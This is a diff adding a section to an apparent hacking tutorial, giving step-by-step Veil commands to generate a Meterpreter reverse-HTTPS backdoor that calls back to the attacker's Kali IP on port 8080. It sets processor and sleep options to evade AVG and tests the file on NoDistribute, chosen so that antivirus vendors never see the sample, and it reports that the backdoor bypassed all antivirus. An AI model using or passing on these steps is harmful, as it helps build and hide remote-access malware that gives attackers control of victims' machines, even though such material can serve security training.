@@ -64,3 +64,42 @@ establish its connection. In our example, that's rev_https. rev, which stands fo
 reverse, and https is the protocol that will be used to establish the connection.
 There are also a few examples of rev_tcp in the preceding screenshot, which
 creates a reverse TCP connection.
+
+## Generating a Veil backdoor
+
+Now we are going to use Veil to generate a backdoor. First, we will run `use 15` to use `15) go/meterpreter/rev_https.py`
+
+![Veil4](/img/Veil4.png)
+
+we will use steps:
+1. we want to set `LHOST`  our IP address 
+
+		set LHOST [your kali IP]
+
+2. we want to change the `LPORT` to be `8080`
+
+		set LPORT 8080
+
+3. To ensure our backdoor can bypass AVG, we need to modify the minimum
+number of `processors` used by it—in this case, 1. To do this, use the following
+command:
+		
+		set PROCESSORS 1
+4. We will also modify the `SLEEP` option, which is the number of seconds a backdoor will wait before it executes the payload. To tell your backdoor to wait 6 seconds, use the following command:
+
+		set SLEEP 6
+
+5. We are now going to generate the backdoor using the `generate` command.
+
+![Veil5](/img/Veil5.png)
+
+We now need to name our backdoor. Here, we're going to name it `rev_https_8080.`
+
+To test our backdoor, we're going to bypass Veil's checkvt command, which is not always accurate, and VirusTotal, which shares its results with antivirus software, and instead opt for the website [NoDistribute](https://nodistribute.com)
+
+![Veil6](/img/Veil6.png)
+
+Once we have clicked Scan File, or View Previous Results, we can see that the
+file we uploaded has successfully bypassed all antivirus programs
+
+![Veil6](/img/Veil6.png)
